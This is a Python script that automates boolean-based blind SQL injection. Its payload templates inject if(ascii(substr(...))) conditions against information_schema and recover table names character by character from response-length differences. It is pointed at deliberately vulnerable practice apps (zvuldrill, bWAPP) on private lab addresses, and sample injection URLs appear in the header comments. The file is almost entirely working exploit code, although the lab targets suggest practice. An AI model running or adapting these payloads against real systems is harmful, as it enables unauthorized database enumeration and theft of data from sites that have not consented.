# -*-coding:utf-8-*-

# id=0 or if((select ascii(substr((select table_name from information_schema.tables where table_schema=0x74657374 limit 0,1),1,1))>115),1,0)
# http://192.168.52.128/test2/zvuldrill-master/search.php?search=1%'+or if((select ascii(substr((select table_name from information_schema.tables where table_schema=0x7A76756C6472696C6C limit 0,1),1,1)) =97),1,0)%23
import urllib
from urllib import request
from data import glovar



def get_tbname(url='http://192.168.52.128/test2/zvuldrill-master/search.php?search=1', cookie=False, type='search',
                    dbname='zvuldrill', tbcount=10):

    response_length = 0

    hex_dbname = ""

    tbname = ""

    tbname_list = []

    for i in dbname:
        hex_dbname += hex(ord(i))

    hex_dbname = '0x' + hex_dbname.replace('0x', '')  #将dbname变成16进制

    if type == 'int':
        payload = '+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + hex_dbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)'
    elif type == 'string':
        payload = '\'+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + hex_dbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)%23'
    elif type == 'search':
        payload = '%\'+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=' + hex_dbname + '+limit+{tbname_order_number},1),{tbname_str_location},1))={ascii_number}),1,0)%23'

    payloads = ["0", "95", "97", "98", "99", "100", "101", "102", "103", "104", "105", "106", "107", "108", "109",
                "110", "111", "112", "113", "114", "115", "116", "117", "118", "119", "120", "121", "122",
                "48", "49", "50", "51", "52", "53", "54", "55", "56", "57"]

    # _ 95    NULL 0

    for i in range(0, tbcount):

        for k in range(1, 35):

            for j in payloads:

                full_payload = url + payload.format(tbname_order_number=str(i), tbname_str_location=str(k),
                                                    ascii_number=str(j))

                url_response = urllib.request.Request(full_payload)

                if (cookie != False):
                    url_response.add_header('Cookie', cookie)

                url_read = request.urlopen(url_response).read()

                url_read_length = len(url_read)

                if (url_read_length - response_length) > 50:

                    response_length = url_read_length  # 与之前的包大小相差很大，所以取较大的返回包大小为正确的返回包

                    tbname = chr(int(j))

                    print(tbname)

                elif (response_length - url_read_length) < 50:  # 如果返回包的长度等于或者在比之前包只小了100之内，则是正确的包

                    # 如果返回了0，说明返回的是NULL,到了表名字的结果，跳出，寻找下一个表
                    if j == '0':
                        tbname_list.append(tbname)

                        print(tbname)

                        tbname = ""

                        break

                    tbname += chr(int(j))

                    print(tbname)

            # 跳出多重循环
            else:

                continue

            break

    print(tbname_list)

def get_dbname_test2(cookie=glovar.cookie):

    response_length = 0

    hex_dbname = ""

    tbname = ""

    tbname_list = []


    full_payload = 'http://172.30.61.112/bWAPP/bWAPP/sqli_2.php?\'action=go&movie=100+or+if((select+ascii(substr((select+table_name+from+information_schema.tables+where+table_schema=0x6277617070+limit+0,1),1,1))=98),1,0)'


    print(full_payload)

    url_response = urllib.request.Request(full_payload)


    url_response.add_header('Cookie', cookie)

    url_read = request.urlopen(url_response).read()

    url_read_length = len(url_read)

    print(url_read_length)




if __name__ == "__main__":

    get_tbname(url=glovar.url3)

    #get_dbname(glovar.url4, cookie=glovar.cookie, type='int', dbname='bwapp',tbcount=5)

